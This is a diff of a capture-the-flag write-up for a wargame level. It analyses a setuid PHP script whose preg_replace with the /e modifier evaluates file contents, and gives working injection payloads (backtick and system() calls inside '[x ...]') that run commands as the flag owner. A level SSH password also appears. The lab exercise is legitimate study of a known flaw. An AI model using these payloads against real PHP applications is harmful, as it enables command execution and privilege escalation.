@@ -2,29 +2,20 @@
 
 ###### tags: `regex` `PHP`
 
-cmd list
-
-```b
-> file ./level06
-> cat level06.php 
-```
-
 Login
 
 ```b
 > ssh level06@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
 > Password: viuaaale9huek52boumoomioc
+```
+```b
 > ls -l
 -rwxr-x---  1 flag06 level06  356 level06.php
 -rwsr-x---+ 1 flag06 level06 7503 level06
    ^ rws → Owner has r|w|x+s permissions
-     ie. any user to exec the bin will exec it as "flag06"
 ```
 
-There are 2 files.
-
-First one is a __PHP__ file <br>
-The other is a binary, the source code of which could be the PHP
+PHP
 
 ```b
 #!/usr/bin/php
@@ -35,10 +26,10 @@ function y($m) {
   return $m;
 }
 function x($y, $z) {
-  $a = file_get_contents($y);
-  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
-  $a = preg_replace("/\[/", "(", $a);
-  $a = preg_replace("/\]/", ")", $a);
+  $a = file_get_contents($y); 👈 1/ $y ie. $argv[1] should be a file
+  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 👈 2/ (.*) get called and the output goes to f()
+  $a = preg_replace("/\[/", "(", $a); 
+  $a = preg_replace("/\]/", ")", $a); 👈 both lines trivial
   return $a;
 }
 $r = x($argv[1], $argv[2]);
@@ -46,84 +37,13 @@ print $r;
 ?>
 ```
 
-Function `y` filters m twice
+### `$a` should have this form `[x (.*)]`
 
 ```b
-function y($m) {
-  $m = preg_replace("/\./", " x ", $m);
-  $m = preg_replace("/@/", " y", $m); 👈 both subs are trivial
-  return $m;
-}
-```
-
-Function `x`:
-
-`function x` filters `$y` ie. `arg[1]` \
-`function x` also disregards `$z` ie. `arg[2]`
-1. `preg_replace`'s syntax is : 
-    - `preg_replace( pattern, replacement_string, source_string )`
-2. Pattern - `"/(\[x (.*)\])/e"` 
-    - Test if anything matches `/(\[x \])/e` - Outer brackets : the 1st capture group
-      - _eg._ `"[x something like this]"` 
-    - Test if anything matches `[x (.*)]` - Inner brackets gives the 2nd capture group
-      - _eg._ `"[x $(whoami)]"` gives `$(whoami)`
-    - the `/e` modifier evaluates `"y(\"\\2\")"` ie. the replacement string 
-3. Replacement - `"y(\"\\2\")"`
-    - The 2nd captured group will go `y( *HERE )` 
-    - `/e` evals the `y( *HERE )` as PHP code 
-      - `/e` is injectiion-attack-prone and has been reprecated long ago
-
-
-```b
-function x($y, $z) {
-  $a = file_get_contents($y);
-  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
-  $a = preg_replace("/\[/", "(", $a);
-  $a = preg_replace("/\]/", ")", $a); 👈 the subs are trivial
-  return $a;
-}
-```
-
-Our goal
-- `file_get_contents($argv[1])` depends on ___content___ of the file 
-- so `argv[1]` to  a FILE 
-- it should be oneline in form of `[x `_cap_`]`
-
-Solution
-
-```b
-# get the _token/flag_ in there to be captured and printed out
-  # we can use shell_exec() system() exec() 
-  # or simply use backticks ~ command substitution
-    # `command` is eqv. to $(command) ~ it exec the cmd and replaces it w. the output
-# `getflag` called
-# ${`getflag`} - get the ret
-# [x ${`getflag`}] - framed in this form
-# echo $(oneliner) > /tmp/temp - push it to a FILE
-
-> echo "[x $(getflag)]" > /tmp/temp
-    OR
-> echo '[x ${`getflag`}]' > /tmp/temp
-    OR
-> echo '[x {${system(getflag)}}]' > /tmp/tmp
+    Either one of
+echo '[x  ${`getflag`}]' > /tmp/tmp
+echo '[x  ${(exec(getflag))}]' > /tmp/tmp
+echo '[x {${system(getflag)}}]' > /tmp/tmp
     THEN
-> ./level06 /tmp/temp
+./level06 /tmp/tmp
 ```
-
-Reverse logic:
-
-- `y($m)` gets called via `/e`
-- if `$m` is `getflag`, `y($m)` will return the flag w. substitution
-- `$m` should be the 2nd capture group in:
-  - `'/(\[x (.*)\])/e'`
-- `$m` should have this form 
-  - `"[x $(getflag)]"`
-- `$()` is shell synatx, it valid equivalents in PHP are ``` `` ``` and `(exec())`
-  - ```'[x `getflag`]'```
-  - `'[x (exec(getflag))]"`
-- we also need to retrieve the output
-  - ```'[x ${`getflag`}]'```
-  - `'[x ${(exec(getflag))}]'`
-- attention: 
-  - `'[x ${(exec(getflag))}]'` and not
-  - `"[x ${(exec(getflag))}]"` bc. `""` allows expansion
